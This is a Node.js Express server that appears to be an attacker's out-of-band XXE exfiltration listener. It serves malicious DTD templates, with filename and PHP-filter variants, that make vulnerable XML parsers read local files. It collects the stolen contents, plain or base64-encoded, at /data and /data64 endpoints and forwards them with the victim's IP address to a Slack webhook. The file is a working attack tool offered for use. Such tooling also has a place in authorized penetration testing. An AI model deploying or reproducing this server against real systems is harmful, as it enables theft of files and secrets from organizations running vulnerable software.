const express = require('express');
const hbs = require('express-handlebars');
const requestIp = require('request-ip');

const slackWebhook = require('slack-webhook');
const WEBHOOK_URL = process.env.SLACK_WEBHOOK;
const slack = new slackWebhook(WEBHOOK_URL);

const router = express.Router();
const app = express()


app.engine('.hbs', hbs( {
  extname: 'hbs',
}));
app.set('view engine', '.hbs');
app.set('views', __dirname + '/templates')

const ipMiddleware = (req, res, next) => {
  let clientIp;
  if (req.header('cf-connecting-ip')){
    req.clientIp = req.header('cf-connecting-ip'); // I want to always give priority to this header
  } else {
    req.clientIp = requestIp.getClientIp(req); // if it's not there then fall back
  }
  next();
};

router.use(ipMiddleware);


router.get('/dtd', (req, res) => {
  console.log('dtd requested');
  let template = '';
  if (req.query.filename) { 
    if (req.query.php) {
      template = 'dtd_php_file';
    } else {
      template = 'dtd_with_file';
    }
  } else {
    template = 'dtd';
  }
  let context = {
    'fileName': req.query.filename ? req.query.filename : null,
    'hostName': req.hostname,
    'protocol': 'https'
  }
  res.setHeader('Content-Type', 'application/xml-dtd');
  res.render(template, context);
});


router.get('/data', (req, res) => {
  let data = decodeURIComponent(req.originalUrl.substring(6));
  console.log('data received');
  exfilData({'data': data, 'clientIp': req.clientIp});
  res.send('');
});

router.get('/data64', (req, res) => {
  let data64 = decodeURIComponent(req.originalUrl.substring(8));
  var buf = Buffer.from(data64,'base64');
  console.log('data received');
  exfilData({'data': buf.toString(), 'clientIp': req.clientIp});
  res.send('');
});
  

// Modify this function to log the data wherever you'd prefer

async function exfilData(exfil) {
  try {
    await slack.send(`*Data from:* \`${exfil.clientIp}\`\n\`\`\`${exfil.data}\`\`\``);
  } catch (err) {
    throw new Error('Problem posting to Slack webhook');
  }

}
app.use(router);
module.exports = app;
